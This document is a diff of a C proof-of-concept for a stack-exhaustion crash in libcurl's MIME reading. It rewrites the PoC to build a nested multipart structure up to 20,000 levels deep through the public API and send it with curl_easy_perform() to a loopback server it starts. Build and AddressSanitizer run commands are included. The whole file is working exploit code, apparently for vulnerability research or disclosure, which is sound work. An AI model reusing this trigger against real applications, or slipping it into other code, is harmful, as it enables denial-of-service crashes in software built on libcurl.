@@ -1,98 +1,118 @@
 /*
  *
- * The MIME read functions are mutually recursive with no depth limit:
+ * When curl_easy_perform() sends a MIME POST it internally calls:
  *   Curl_mime_read -> readback_part -> read_part_content (MIMEKIND_MULTIPART)
- *   -> mime_subparts_read -> readback_part -> ... (repeats indefinitely)
+ *   -> mime_subparts_read -> readback_part -> ... (no depth limit)
  *
- * By creating 10000+ levels of nested multipart MIME structures, each level
- * adds stack frames for mime_subparts_read + read_part_content + readback_part.
- * At ~9500+ nesting levels this exhausts the default 8MB stack.
- *
- * Confirmed with AddressSanitizer: stack-overflow at mime.c:684
- * in readback_bytes, called from the recursive chain.
+ * At ~9500+ nesting levels this exhausts the 8 MB default thread stack.
+ * Under ASAN (5x frame inflation) use depth >= 20000.
  *
  * Build:
- *   clang -fsanitize=address -g poc_sf12.c \
+ *   clang -fsanitize=address -fno-omit-frame-pointer -g -O1 poc.c \
  *     -I/path/to/curl/include /path/to/libcurl.a \
- *     -lssl -lcrypto -lz -o poc_sf12
+ *     -lssl -lcrypto -lz -lpthread -ldl -o poc
  *
  * Run:
- *   ASAN_OPTIONS=detect_leaks=0 ./poc_sf12 10000
+ *   ASAN_OPTIONS='halt_on_error=1:print_stacktrace=1:detect_leaks=0' ./poc 20000
  */
 
 #include <curl/curl.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <unistd.h>
+#include <pthread.h>
 
-/* External declaration for Curl_mime_read (exported symbol) */
-extern size_t Curl_mime_read(char *buffer, size_t size, size_t nitems, void *instream);
+/* Minimal loopback HTTP/1.1 server — accepts one connection, drains it. */
+static void *accept_and_drain(void *arg)
+{
+    int listenfd = *(int *)arg;
+    struct sockaddr_in peer;
+    socklen_t plen = sizeof(peer);
+    int connfd = accept(listenfd, (struct sockaddr *)&peer, &plen);
+    if (connfd >= 0) {
+        const char *resp =
+            "HTTP/1.1 200 OK\r\n"
+            "Content-Length: 0\r\n"
+            "Connection: close\r\n\r\n";
+        (void)send(connfd, resp, strlen(resp), 0);
+        char buf[4096];
+        while (recv(connfd, buf, sizeof(buf), 0) > 0)
+            ;
+        close(connfd);
+    }
+    close(listenfd);
+    return NULL;
+}
 
-int main(int argc, char **argv) {
+int main(int argc, char **argv)
+{
     int depth = argc > 1 ? atoi(argv[1]) : 10000;
 
-    fprintf(stderr, "[SF12] Building %d-deep nested multipart MIME structure\n", depth);
+    /* Bind a loopback listener so curl_easy_perform() has somewhere to connect. */
+    int listenfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (listenfd < 0) { perror("socket"); return 1; }
+    int optval = 1;
+    setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
+    struct sockaddr_in addr;
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family      = AF_INET;
+    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+    addr.sin_port        = 0;  /* OS picks a free port */
+    if (bind(listenfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) { perror("bind"); return 1; }
+    listen(listenfd, 1);
+    socklen_t alen = sizeof(addr);
+    getsockname(listenfd, (struct sockaddr *)&addr, &alen);
+    int port = ntohs(addr.sin_port);
+
+    pthread_t tid;
+    pthread_create(&tid, NULL, accept_and_drain, &listenfd);
 
     curl_global_init(CURL_GLOBAL_DEFAULT);
     CURL *curl = curl_easy_init();
-    if(!curl) {
-        fprintf(stderr, "curl_easy_init failed\n");
-        return 1;
-    }
+    if (!curl) { fprintf(stderr, "curl_easy_init failed\n"); return 1; }
 
-    /* Build innermost MIME with data */
-    curl_mime *prev = curl_mime_init(curl);
-    if(!prev) {
-        fprintf(stderr, "curl_mime_init failed\n");
-        curl_easy_cleanup(curl);
-        return 1;
-    }
-    curl_mimepart *leaf = curl_mime_addpart(prev);
-    curl_mime_data(leaf, "leaf_data", CURL_ZERO_TERMINATED);
+    /* Build an N-deep nested multipart MIME tree using public API. */
+    fprintf(stderr, "[PoC] Building %d-deep nested multipart MIME structure\n", depth);
+    curl_mime *inner = curl_mime_init(curl);
+    curl_mimepart *leaf = curl_mime_addpart(inner);
+    curl_mime_data(leaf, "leaf", CURL_ZERO_TERMINATED);
 
-    /* Nest depth levels deep: each level wraps previous mime as a subpart */
-    for(int i = 0; i < depth; i++) {
+    for (int i = 0; i < depth; i++) {
         curl_mime *outer = curl_mime_init(curl);
-        if(!outer) {
-            fprintf(stderr, "OOM at depth %d\n", i);
-            break;
-        }
-        curl_mimepart *p = curl_mime_addpart(outer);
-        CURLcode rc = curl_mime_subparts(p, prev);
-        if(rc != CURLE_OK) {
+        curl_mimepart *p  = curl_mime_addpart(outer);
+        CURLcode rc = curl_mime_subparts(p, inner);
+        if (rc != CURLE_OK) {
             fprintf(stderr, "curl_mime_subparts failed at depth %d: %s\n",
                     i, curl_easy_strerror(rc));
-            curl_mime_free(outer);
             break;
         }
-        prev = outer;
+        inner = outer;
     }
-
-    fprintf(stderr, "[SF12] Nested structure ready. Triggering MIME read...\n");
 
     /*
-     * Create a top-level wrapper part and call Curl_mime_read.
-     * This triggers the recursive chain:
-     *   Curl_mime_read -> readback_part -> read_part_content (MIMEKIND_MULTIPART)
-     *   -> mime_subparts_read -> readback_part -> ... (depth times)
+     * POST the nested structure via the documented public API.
+     * curl_easy_perform() internally drives the MIME read chain:
+     *   readback_part -> read_part_content (MIMEKIND_MULTIPART) ->
+     *   mime_subparts_read -> readback_part -> ...  (depth times)
+     * This causes stack exhaustion at ~9500+ levels.
      */
-    curl_mime *top = curl_mime_init(curl);
-    curl_mimepart *top_part = curl_mime_addpart(top);
-    curl_mime_subparts(top_part, prev);
+    char url[64];
+    snprintf(url, sizeof(url), "http://127.0.0.1:%d/", port);
+    curl_easy_setopt(curl, CURLOPT_URL, url);
+    curl_easy_setopt(curl, CURLOPT_MIMEPOST, inner);  /* documented public API */
 
-    char buf[8192];
-    size_t n;
-    size_t total = 0;
-    int iter = 0;
+    fprintf(stderr, "[PoC] Triggering MIME read via curl_easy_perform()...\n");
+    CURLcode res = curl_easy_perform(curl);
 
-    /* This will trigger the recursive read chain and stack-overflow at ~9500+ depth */
-    while((n = Curl_mime_read(buf, 1, sizeof(buf), top_part)) > 0) {
-        total += n;
-        if(++iter > 100000) break;
-    }
+    if (res == CURLE_OK)
+        fprintf(stderr, "[PoC] Completed without crash (depth %d may be too shallow)\n", depth);
+    else
+        fprintf(stderr, "[PoC] curl_easy_perform returned: %s\n", curl_easy_strerror(res));
 
-    fprintf(stderr, "[SF12] Read %zu bytes (n=%zu) - no crash at this depth\n", total, n);
-
+    pthread_join(tid, NULL);
     curl_easy_cleanup(curl);
     curl_global_cleanup();
     return 0;
